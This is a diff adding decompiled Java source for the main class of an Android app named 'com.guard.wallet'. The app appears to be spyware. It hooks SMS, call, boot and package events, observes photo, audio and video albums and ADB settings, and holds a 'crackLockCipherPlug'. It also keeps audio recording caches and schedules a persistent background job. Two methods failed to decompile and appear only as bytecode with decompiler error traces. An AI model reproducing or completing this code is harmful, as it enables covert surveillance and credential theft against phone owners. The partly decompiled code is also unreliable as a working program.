@@ -1,0 +1,1543 @@
+package com.guard.wallet;
+
+import a1.q;
+import android.annotation.SuppressLint;
+import android.app.Application;
+import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.IntentFilter;
+import android.net.Uri;
+import android.os.Handler;
+import android.os.Build.VERSION;
+import android.provider.MediaStore.Images.Media;
+import android.provider.Settings.Global;
+import android.support.annotation.NonNull;
+import android.util.Log;
+import b1.l;
+import com.guard.wallet.entity.BuildConfig;
+import com.guard.wallet.helper.o;
+import com.guard.wallet.helper.r;
+import com.guard.wallet.http.i;
+import com.guard.wallet.http.y;
+import com.guard.wallet.plug.c;
+import com.guard.wallet.receiver.AlarmReceiver;
+import com.guard.wallet.receiver.BatteryLevelReceiver;
+import com.guard.wallet.receiver.BootBroadcast;
+import com.guard.wallet.receiver.CallReceiver;
+import com.guard.wallet.receiver.LocaleChangeReceiver;
+import com.guard.wallet.receiver.NetWorkReceiver;
+import com.guard.wallet.receiver.PackageReceiver;
+import com.guard.wallet.receiver.PowerBroadcastReceiver;
+import com.guard.wallet.receiver.ScreenBroadcastReceiver;
+import com.guard.wallet.receiver.ShutDownBroadcastReceiver;
+import com.guard.wallet.receiver.SmsReceiver;
+import com.guard.wallet.service.CustomNotificationService;
+import com.guard.wallet.thread.b;
+import com.guard.wallet.thread.e;
+import com.guard.wallet.thread.f;
+import com.guard.wallet.thread.j;
+import com.guard.wallet.utils.g;
+import com.guard.wallet.utils.h;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Objects;
+import java.util.Timer;
+import java.util.concurrent.ExecutorService;
+import l.a;
+import sun.misc.Unsafe;
+import y.d;
+
+public class MainApplication {
+   private static final String TAG = "MainApplication";
+   private static final a activityLifecycleCallbacks = new a();
+   @SuppressLint({"StaticFieldLeak"})
+   private static Context baseContext;
+   @SuppressLint({"StaticFieldLeak"})
+   private static Context context;
+   @SuppressLint({"StaticFieldLeak"})
+   private static MainApplication instance;
+   private d adbEnabledContentObserver;
+   private d adbWIFIEnabledContentObserver;
+   private AlarmReceiver alarmReceiver;
+   private y.a audioAlbumContentObserver;
+   private BatteryLevelReceiver batteryReceiver;
+   private BootBroadcast bootReceiver;
+   private BuildConfig buildConfig;
+   private CallReceiver callReceiver;
+   private b checkThread;
+   private y.b configFileDeleteObserver;
+   private c crackLockCipherPlug;
+   private d devEnabledContentObserver;
+   private e handlerMsgAndTimer;
+   private f heartThread;
+   private boolean isUserUnlockedInstance = false;
+   private a0.c jobSchedulerManage;
+   private LocaleChangeReceiver localeChangeReceiver;
+   private NetWorkReceiver netWorkReceiver;
+   private PackageReceiver packageReceiver;
+   private y.c photoAlbumContentObserver;
+   private PowerBroadcastReceiver powerReceiver;
+   private ScreenBroadcastReceiver screenReceiver;
+   private ShutDownBroadcastReceiver shutDownReceiver;
+   private u.b smsMessageListener;
+   private SmsReceiver smsReceiver;
+   private y.e videoAlbumContentObserver;
+
+   public MainApplication() {
+      Log.d("MainApplication", "MainApplication begin create");
+      int var1 = l.a;
+      Log.d("MainApplication", "MainApplication end create");
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   // $VF: Could not inline inconsistent finally blocks
+   // $VF: Could not create synchronized statement, marking monitor enters and exits
+   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+   public static void destroy(@NonNull Application var0) {
+      String var1 = g.a0(var0);
+      if (instance != null && Objects.equals(var0.getPackageName(), var1)) {
+         synchronized (MainApplication.class){} // $VF: monitorenter 
+
+         label175: {
+            Throwable var10000;
+            label176: {
+               try {
+                  var23 = instance;
+               } catch (Throwable var21) {
+                  var10000 = var21;
+                  boolean var10001 = false;
+                  break label176;
+               }
+
+               if (var23 != null) {
+                  try {
+                     var23.terminate();
+                     instance = null;
+                  } catch (Throwable var20) {
+                     var10000 = var20;
+                     boolean var24 = false;
+                     break label176;
+                  }
+               }
+
+               label161:
+               try {
+                  // $VF: monitorexit
+                  break label175;
+               } catch (Throwable var19) {
+                  var10000 = var19;
+                  boolean var25 = false;
+                  break label161;
+               }
+            }
+
+            while (true) {
+               Throwable var22 = var10000;
+
+               try {
+                  // $VF: monitorexit
+                  throw var22;
+               } catch (Throwable var18) {
+                  var10000 = var18;
+                  boolean var26 = false;
+                  continue;
+               }
+            }
+         }
+
+         context = null;
+         baseContext = null;
+         var0.unregisterActivityLifecycleCallbacks(activityLifecycleCallbacks);
+      }
+   }
+
+   public static Context getAppContext() {
+      return context;
+   }
+
+   public static Context getBaseContext() {
+      return baseContext;
+   }
+
+   public static MainApplication getInstance() {
+      return instance;
+   }
+
+   public static void init(@NonNull Application param0) {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
+      //
+      // Bytecode:
+      // 00: aload 0
+      // 01: invokestatic com/guard/wallet/utils/g.a0 (Landroid/content/Context;)Ljava/lang/String;
+      // 04: astore 1
+      // 05: getstatic com/guard/wallet/MainApplication.instance Lcom/guard/wallet/MainApplication;
+      // 08: ifnonnull 6c
+      // 0b: aload 0
+      // 0c: invokevirtual android/content/Context.getPackageName ()Ljava/lang/String;
+      // 0f: aload 1
+      // 10: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
+      // 13: ifeq 6c
+      // 16: ldc com/guard/wallet/MainApplication
+      // 18: monitorenter
+      // 19: getstatic com/guard/wallet/MainApplication.instance Lcom/guard/wallet/MainApplication;
+      // 1c: ifnonnull 60
+      // 1f: ldc "MainApplication"
+      // 21: ldc "MainApplication instance create"
+      // 23: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 26: pop
+      // 27: aload 0
+      // 28: invokevirtual android/content/ContextWrapper.getBaseContext ()Landroid/content/Context;
+      // 2b: putstatic com/guard/wallet/MainApplication.baseContext Landroid/content/Context;
+      // 2e: aload 0
+      // 2f: invokevirtual android/content/Context.getApplicationContext ()Landroid/content/Context;
+      // 32: putstatic com/guard/wallet/MainApplication.context Landroid/content/Context;
+      // 35: new com/guard/wallet/MainApplication
+      // 38: astore 1
+      // 39: aload 1
+      // 3a: invokespecial com/guard/wallet/MainApplication.<init> ()V
+      // 3d: aload 1
+      // 3e: putstatic com/guard/wallet/MainApplication.instance Lcom/guard/wallet/MainApplication;
+      // 41: aload 1
+      // 42: invokevirtual com/guard/wallet/MainApplication.init ()V
+      // 45: aload 0
+      // 46: getstatic com/guard/wallet/MainApplication.activityLifecycleCallbacks Ll/a;
+      // 49: invokevirtual android/app/Application.registerActivityLifecycleCallbacks (Landroid/app/Application$ActivityLifecycleCallbacks;)V
+      // 4c: invokestatic com/guard/wallet/thread/c.a ()Lcom/guard/wallet/thread/c;
+      // 4f: astore 0
+      // 50: aload 0
+      // 51: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
+      // 54: pop
+      // 55: aload 0
+      // 56: invokestatic java/lang/Thread.getDefaultUncaughtExceptionHandler ()Ljava/lang/Thread$UncaughtExceptionHandler;
+      // 59: putfield com/guard/wallet/thread/c.a Ljava/lang/Thread$UncaughtExceptionHandler;
+      // 5c: aload 0
+      // 5d: invokestatic java/lang/Thread.setDefaultUncaughtExceptionHandler (Ljava/lang/Thread$UncaughtExceptionHandler;)V
+      // 60: ldc com/guard/wallet/MainApplication
+      // 62: monitorexit
+      // 63: goto 6c
+      // 66: astore 0
+      // 67: ldc com/guard/wallet/MainApplication
+      // 69: monitorexit
+      // 6a: aload 0
+      // 6b: athrow
+      // 6c: return
+   }
+
+   public void exitApp() {
+      System.exit(0);
+   }
+
+   public d getAdbEnabledContentObserver() {
+      return this.adbEnabledContentObserver;
+   }
+
+   public d getAdbWIFIEnabledContentObserver() {
+      return this.adbWIFIEnabledContentObserver;
+   }
+
+   public AlarmReceiver getAlarmReceiver() {
+      return this.alarmReceiver;
+   }
+
+   public y.a getAudioAlbumContentObserver() {
+      return this.audioAlbumContentObserver;
+   }
+
+   public BatteryLevelReceiver getBatteryReceiver() {
+      return this.batteryReceiver;
+   }
+
+   public BootBroadcast getBootReceiver() {
+      return this.bootReceiver;
+   }
+
+   public BuildConfig getBuildConfig() {
+      if (this.buildConfig == null) {
+         this.buildConfig = com.guard.wallet.utils.d.a();
+      }
+
+      return this.buildConfig;
+   }
+
+   public CallReceiver getCallReceiver() {
+      return this.callReceiver;
+   }
+
+   public b getCheckThread() {
+      return this.checkThread;
+   }
+
+   public y.b getConfigFileDeleteObserver() {
+      return this.configFileDeleteObserver;
+   }
+
+   public ContentResolver getContentResolver() {
+      Context var1 = context;
+      return var1 != null ? var1.getContentResolver() : null;
+   }
+
+   public c getCrackLockCipherPlug() {
+      return this.crackLockCipherPlug;
+   }
+
+   public d getDevEnabledContentObserver() {
+      return this.devEnabledContentObserver;
+   }
+
+   public e getHandlerMsgAndTimer() {
+      return this.handlerMsgAndTimer;
+   }
+
+   public f getHeartThread() {
+      return this.heartThread;
+   }
+
+   public a0.c getJobSchedulerManage() {
+      return this.jobSchedulerManage;
+   }
+
+   public LocaleChangeReceiver getLocaleChangeReceiver() {
+      return this.localeChangeReceiver;
+   }
+
+   public NetWorkReceiver getNetWorkReceiver() {
+      return this.netWorkReceiver;
+   }
+
+   public String getPackageName() {
+      Context var1 = context;
+      return var1 != null ? var1.getPackageName() : null;
+   }
+
+   public PackageReceiver getPackageReceiver() {
+      return this.packageReceiver;
+   }
+
+   public y.c getPhotoAlbumContentObserver() {
+      return this.photoAlbumContentObserver;
+   }
+
+   public PowerBroadcastReceiver getPowerReceiver() {
+      return this.powerReceiver;
+   }
+
+   public ScreenBroadcastReceiver getScreenReceiver() {
+      return this.screenReceiver;
+   }
+
+   public ShutDownBroadcastReceiver getShutDownReceiver() {
+      return this.shutDownReceiver;
+   }
+
+   public u.b getSmsMessageListener() {
+      return this.smsMessageListener;
+   }
+
+   public SmsReceiver getSmsReceiver() {
+      return this.smsReceiver;
+   }
+
+   public y.e getVideoAlbumContentObserver() {
+      return this.videoAlbumContentObserver;
+   }
+
+   public void init() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
+      //
+      // Bytecode:
+      // 000: ldc "MainApplication"
+      // 002: ldc_w "com.guard.wallet 正在启动"
+      // 005: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 008: pop
+      // 009: aload 0
+      // 00a: putstatic com/guard/wallet/MainApplication.instance Lcom/guard/wallet/MainApplication;
+      // 00d: getstatic j/d.m Ljava/lang/String;
+      // 010: astore 4
+      // 012: new java/lang/StringBuilder
+      // 015: dup
+      // 016: invokespecial java/lang/StringBuilder.<init> ()V
+      // 019: astore 4
+      // 01b: aload 4
+      // 01d: invokestatic com/guard/wallet/utils/g.i0 ()Ljava/lang/String;
+      // 020: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
+      // 023: pop
+      // 024: aload 4
+      // 026: getstatic java/io/File.separator Ljava/lang/String;
+      // 029: ldc_w "CacheAudios"
+      // 02c: invokestatic a/a.n (Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+      // 02f: putstatic j/d.m Ljava/lang/String;
+      // 032: new java/io/File
+      // 035: dup
+      // 036: getstatic j/d.m Ljava/lang/String;
+      // 039: invokespecial java/io/File.<init> (Ljava/lang/String;)V
+      // 03c: astore 4
+      // 03e: aload 4
+      // 040: invokevirtual java/io/File.exists ()Z
+      // 043: ifne 06b
+      // 046: aload 4
+      // 048: invokevirtual java/io/File.mkdirs ()Z
+      // 04b: istore 3
+      // 04c: getstatic java/util/Locale.CHINA Ljava/util/Locale;
+      // 04f: ldc_w "PCM目录:%s -> %b"
+      // 052: bipush 2
+      // 053: anewarray 4
+      // 056: dup
+      // 057: bipush 0
+      // 058: getstatic j/d.m Ljava/lang/String;
+      // 05b: aastore
+      // 05c: dup
+      // 05d: bipush 1
+      // 05e: iload 3
+      // 05f: invokestatic java/lang/Boolean.valueOf (Z)Ljava/lang/Boolean;
+      // 062: aastore
+      // 063: invokestatic java/lang/String.format (Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
+      // 066: astore 4
+      // 068: goto 0de
+      // 06b: aload 4
+      // 06d: invokevirtual java/io/File.listFiles ()[Ljava/io/File;
+      // 070: ifnull 0c9
+      // 073: aload 4
+      // 075: invokevirtual java/io/File.listFiles ()[Ljava/io/File;
+      // 078: arraylength
+      // 079: ifle 0c9
+      // 07c: aload 4
+      // 07e: invokevirtual java/io/File.listFiles ()[Ljava/io/File;
+      // 081: astore 4
+      // 083: aload 4
+      // 085: invokestatic java/util/Objects.requireNonNull (Ljava/lang/Object;)Ljava/lang/Object;
+      // 088: pop
+      // 089: aload 4
+      // 08b: arraylength
+      // 08c: istore 2
+      // 08d: bipush 0
+      // 08e: istore 1
+      // 08f: iload 1
+      // 090: iload 2
+      // 091: if_icmpge 0c9
+      // 094: aload 4
+      // 096: iload 1
+      // 097: aaload
+      // 098: astore 5
+      // 09a: aload 5
+      // 09c: invokevirtual java/io/File.delete ()Z
+      // 09f: istore 3
+      // 0a0: ldc_w "AudioRecordManager"
+      // 0a3: getstatic java/util/Locale.CHINA Ljava/util/Locale;
+      // 0a6: ldc_w "删除PCM文件:%s %b"
+      // 0a9: bipush 2
+      // 0aa: anewarray 4
+      // 0ad: dup
+      // 0ae: bipush 0
+      // 0af: aload 5
+      // 0b1: invokevirtual java/io/File.getName ()Ljava/lang/String;
+      // 0b4: aastore
+      // 0b5: dup
+      // 0b6: bipush 1
+      // 0b7: iload 3
+      // 0b8: invokestatic java/lang/Boolean.valueOf (Z)Ljava/lang/Boolean;
+      // 0bb: aastore
+      // 0bc: invokestatic java/lang/String.format (Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
+      // 0bf: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 0c2: pop
+      // 0c3: iinc 1 1
+      // 0c6: goto 08f
+      // 0c9: getstatic java/util/Locale.CHINA Ljava/util/Locale;
+      // 0cc: ldc_w "PCM目录:%s"
+      // 0cf: bipush 1
+      // 0d0: anewarray 4
+      // 0d3: dup
+      // 0d4: bipush 0
+      // 0d5: getstatic j/d.m Ljava/lang/String;
+      // 0d8: aastore
+      // 0d9: invokestatic java/lang/String.format (Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
+      // 0dc: astore 4
+      // 0de: ldc_w "AudioRecordManager"
+      // 0e1: aload 4
+      // 0e3: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 0e6: pop
+      // 0e7: new java/lang/StringBuilder
+      // 0ea: dup
+      // 0eb: invokespecial java/lang/StringBuilder.<init> ()V
+      // 0ee: astore 4
+      // 0f0: aload 4
+      // 0f2: invokestatic com/guard/wallet/utils/g.i0 ()Ljava/lang/String;
+      // 0f5: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
+      // 0f8: pop
+      // 0f9: aload 4
+      // 0fb: getstatic java/io/File.separator Ljava/lang/String;
+      // 0fe: ldc_w "CacheAudios"
+      // 101: invokestatic a/a.n (Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+      // 104: putstatic j/d.n Ljava/lang/String;
+      // 107: new java/io/File
+      // 10a: dup
+      // 10b: getstatic j/d.n Ljava/lang/String;
+      // 10e: invokespecial java/io/File.<init> (Ljava/lang/String;)V
+      // 111: astore 4
+      // 113: aload 4
+      // 115: invokevirtual java/io/File.exists ()Z
+      // 118: ifne 140
+      // 11b: aload 4
+      // 11d: invokevirtual java/io/File.mkdirs ()Z
+      // 120: istore 3
+      // 121: getstatic java/util/Locale.CHINA Ljava/util/Locale;
+      // 124: ldc_w "wav目录:%s -> %b"
+      // 127: bipush 2
+      // 128: anewarray 4
+      // 12b: dup
+      // 12c: bipush 0
+      // 12d: getstatic j/d.n Ljava/lang/String;
+      // 130: aastore
+      // 131: dup
+      // 132: bipush 1
+      // 133: iload 3
+      // 134: invokestatic java/lang/Boolean.valueOf (Z)Ljava/lang/Boolean;
+      // 137: aastore
+      // 138: invokestatic java/lang/String.format (Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
+      // 13b: astore 4
+      // 13d: goto 155
+      // 140: getstatic java/util/Locale.CHINA Ljava/util/Locale;
+      // 143: ldc_w "wav目录:%s"
+      // 146: bipush 1
+      // 147: anewarray 4
+      // 14a: dup
+      // 14b: bipush 0
+      // 14c: getstatic j/d.n Ljava/lang/String;
+      // 14f: aastore
+      // 150: invokestatic java/lang/String.format (Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
+      // 153: astore 4
+      // 155: ldc_w "AudioRecordManager"
+      // 158: aload 4
+      // 15a: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 15d: pop
+      // 15e: aload 0
+      // 15f: getfield com/guard/wallet/MainApplication.handlerMsgAndTimer Lcom/guard/wallet/thread/e;
+      // 162: ifnonnull 170
+      // 165: aload 0
+      // 166: new com/guard/wallet/thread/e
+      // 169: dup
+      // 16a: invokespecial com/guard/wallet/thread/e.<init> ()V
+      // 16d: putfield com/guard/wallet/MainApplication.handlerMsgAndTimer Lcom/guard/wallet/thread/e;
+      // 170: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 173: ifnonnull 19f
+      // 176: ldc_w com/guard/wallet/thread/j
+      // 179: monitorenter
+      // 17a: getstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 17d: ifnonnull 18f
+      // 180: new com/guard/wallet/thread/j
+      // 183: astore 4
+      // 185: aload 4
+      // 187: invokespecial com/guard/wallet/thread/j.<init> ()V
+      // 18a: aload 4
+      // 18c: putstatic com/guard/wallet/thread/j.g Lcom/guard/wallet/thread/j;
+      // 18f: ldc_w com/guard/wallet/thread/j
+      // 192: monitorexit
+      // 193: goto 19f
+      // 196: astore 4
+      // 198: ldc_w com/guard/wallet/thread/j
+      // 19b: monitorexit
+      // 19c: aload 4
+      // 19e: athrow
+      // 19f: aload 0
+      // 1a0: getfield com/guard/wallet/MainApplication.jobSchedulerManage La0/c;
+      // 1a3: ifnonnull 26a
+      // 1a6: getstatic com/guard/wallet/MainApplication.context Landroid/content/Context;
+      // 1a9: astore 4
+      // 1ab: new a0/c
+      // 1ae: dup
+      // 1af: aload 4
+      // 1b1: invokespecial a0/c.<init> (Landroid/content/Context;)V
+      // 1b4: astore 5
+      // 1b6: aload 0
+      // 1b7: aload 5
+      // 1b9: putfield com/guard/wallet/MainApplication.jobSchedulerManage La0/c;
+      // 1bc: aload 5
+      // 1be: getfield a0/c.a Landroid/app/job/JobScheduler;
+      // 1c1: astore 5
+      // 1c3: aload 5
+      // 1c5: bipush 116
+      // 1c7: invokevirtual android/app/job/JobScheduler.getPendingJob (I)Landroid/app/job/JobInfo;
+      // 1ca: ifnonnull 26a
+      // 1cd: new android/content/Intent
+      // 1d0: astore 6
+      // 1d2: aload 6
+      // 1d4: aload 4
+      // 1d6: ldc_w com/guard/wallet/service/WIFIBackgroundService
+      // 1d9: invokespecial android/content/Intent.<init> (Landroid/content/Context;Ljava/lang/Class;)V
+      // 1dc: aload 4
+      // 1de: aload 6
+      // 1e0: invokevirtual android/content/Context.startService (Landroid/content/Intent;)Landroid/content/ComponentName;
+      // 1e3: pop
+      // 1e4: new android/content/ComponentName
+      // 1e7: astore 6
+      // 1e9: aload 6
+      // 1eb: aload 4
+      // 1ed: ldc_w com/guard/wallet/service/WIFIBackgroundService
+      // 1f0: invokespecial android/content/ComponentName.<init> (Landroid/content/Context;Ljava/lang/Class;)V
+      // 1f3: new android/app/job/JobInfo$Builder
+      // 1f6: astore 4
+      // 1f8: aload 4
+      // 1fa: bipush 116
+      // 1fc: aload 6
+      // 1fe: invokespecial android/app/job/JobInfo$Builder.<init> (ILandroid/content/ComponentName;)V
+      // 201: aload 4
+      // 203: bipush 1
+      // 204: invokevirtual android/app/job/JobInfo$Builder.setPersisted (Z)Landroid/app/job/JobInfo$Builder;
+      // 207: pop
+      // 208: aload 4
+      // 20a: bipush 0
+      // 20b: invokevirtual android/app/job/JobInfo$Builder.setRequiresCharging (Z)Landroid/app/job/JobInfo$Builder;
+      // 20e: pop
+      // 20f: aload 4
+      // 211: bipush 0
+      // 212: invokevirtual android/app/job/JobInfo$Builder.setRequiresDeviceIdle (Z)Landroid/app/job/JobInfo$Builder;
+      // 215: pop
+      // 216: aload 4
+      // 218: ldc2_w 5000
+      // 21b: bipush 0
+      // 21c: invokevirtual android/app/job/JobInfo$Builder.setBackoffCriteria (JI)Landroid/app/job/JobInfo$Builder;
+      // 21f: pop
+      // 220: aload 4
+      // 222: ldc2_w 5000
+      // 225: invokevirtual android/app/job/JobInfo$Builder.setMinimumLatency (J)Landroid/app/job/JobInfo$Builder;
+      // 228: pop
+      // 229: aload 4
+      // 22b: bipush 1
+      // 22c: invokevirtual android/app/job/JobInfo$Builder.setRequiredNetworkType (I)Landroid/app/job/JobInfo$Builder;
+      // 22f: pop
+      // 230: aload 4
+      // 232: ldc2_w 5000
+      // 235: invokevirtual android/app/job/JobInfo$Builder.setTriggerContentMaxDelay (J)Landroid/app/job/JobInfo$Builder;
+      // 238: pop
+      // 239: aload 5
+      // 23b: aload 4
+      // 23d: invokevirtual android/app/job/JobInfo$Builder.build ()Landroid/app/job/JobInfo;
+      // 240: invokevirtual android/app/job/JobScheduler.schedule (Landroid/app/job/JobInfo;)I
+      // 243: ifgt 253
+      // 246: ldc_w "JobSchedulerManage"
+      // 249: ldc_w "wifi-lock-server job schedule failed"
+      // 24c: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
+      // 24f: pop
+      // 250: goto 26a
+      // 253: ldc_w "JobSchedulerManage"
+      // 256: ldc_w "wifi-lock-server job schedule success"
+      // 259: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 25c: pop
+      // 25d: goto 26a
+      // 260: astore 4
+      // 262: ldc_w "JobSchedulerManage"
+      // 265: aload 4
+      // 267: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
+      // 26a: invokestatic com/guard/wallet/utils/g.W0 ()V
+      // 26d: invokestatic com/guard/wallet/utils/g.k1 ()V
+      // 270: invokestatic com/guard/wallet/utils/g.c1 ()V
+      // 273: invokestatic com/guard/wallet/utils/g.l1 ()V
+      // 276: invokestatic com/guard/wallet/utils/g.b1 ()V
+      // 279: invokestatic com/guard/wallet/utils/g.j1 ()V
+      // 27c: invokestatic com/guard/wallet/utils/g.h1 ()V
+      // 27f: invokestatic com/guard/wallet/utils/g.i1 ()V
+      // 282: invokestatic com/guard/wallet/utils/g.m1 ()V
+      // 285: invokestatic com/guard/wallet/utils/g.e1 ()V
+      // 288: ldc com/guard/wallet/utils/g
+      // 28a: monitorenter
+      // 28b: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
+      // 28e: ifnull 2e8
+      // 291: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
+      // 294: invokevirtual com/guard/wallet/MainApplication.getLocaleChangeReceiver ()Lcom/guard/wallet/receiver/LocaleChangeReceiver;
+      // 297: ifnonnull 2e8
+      // 29a: new android/content/IntentFilter
+      // 29d: astore 5
+      // 29f: aload 5
+      // 2a1: invokespecial android/content/IntentFilter.<init> ()V
+      // 2a4: aload 5
+      // 2a6: ldc_w "android.intent.action.LOCALE_CHANGED"
+      // 2a9: invokevirtual android/content/IntentFilter.addAction (Ljava/lang/String;)V
+      // 2ac: new com/guard/wallet/receiver/LocaleChangeReceiver
+      // 2af: astore 4
+      // 2b1: aload 4
+      // 2b3: invokespecial com/guard/wallet/receiver/LocaleChangeReceiver.<init> ()V
+      // 2b6: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
+      // 2b9: aload 4
+      // 2bb: invokevirtual com/guard/wallet/MainApplication.setLocaleChangeReceiver (Lcom/guard/wallet/receiver/LocaleChangeReceiver;)V
+      // 2be: getstatic android/os/Build$VERSION.SDK_INT I
+      // 2c1: bipush 33
+      // 2c3: if_icmplt 2d4
+      // 2c6: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
+      // 2c9: aload 4
+      // 2cb: aload 5
+      // 2cd: bipush 2
+      // 2ce: invokevirtual com/guard/wallet/MainApplication.registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)V
+      // 2d1: goto 2de
+      // 2d4: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
+      // 2d7: aload 4
+      // 2d9: aload 5
+      // 2db: invokevirtual com/guard/wallet/MainApplication.registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)V
+      // 2de: ldc_w "ReceiverUtils"
+      // 2e1: ldc_w "localeChangeReceiver 启动完成"
+      // 2e4: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 2e7: pop
+      // 2e8: ldc com/guard/wallet/utils/g
+      // 2ea: monitorexit
+      // 2eb: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
+      // 2ee: ifnonnull 31a
+      // 2f1: ldc_w com/guard/wallet/server/b
+      // 2f4: monitorenter
+      // 2f5: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
+      // 2f8: ifnonnull 30a
+      // 2fb: new com/guard/wallet/server/b
+      // 2fe: astore 4
+      // 300: aload 4
+      // 302: invokespecial com/guard/wallet/server/b.<init> ()V
+      // 305: aload 4
+      // 307: putstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
+      // 30a: ldc_w com/guard/wallet/server/b
+      // 30d: monitorexit
+      // 30e: goto 31a
+      // 311: astore 4
+      // 313: ldc_w com/guard/wallet/server/b
+      // 316: monitorexit
+      // 317: aload 4
+      // 319: athrow
+      // 31a: getstatic com/guard/wallet/server/b.b Lcom/guard/wallet/server/b;
+      // 31d: invokevirtual com/guard/wallet/server/b.W2 ()V
+      // 320: invokestatic com/guard/wallet/server/c.H ()V
+      // 323: aload 0
+      // 324: getfield com/guard/wallet/MainApplication.smsMessageListener Lu/b;
+      // 327: ifnonnull 345
+      // 32a: new u/b
+      // 32d: dup
+      // 32e: invokespecial u/b.<init> ()V
+      // 331: astore 4
+      // 333: aload 0
+      // 334: aload 4
+      // 336: putfield com/guard/wallet/MainApplication.smsMessageListener Lu/b;
+      // 339: aload 4
+      // 33b: invokevirtual u/b.a ()Z
+      // 33e: ifeq 345
+      // 341: invokestatic com/guard/wallet/http/l.y ()Z
+      // 344: pop
+      // 345: aload 0
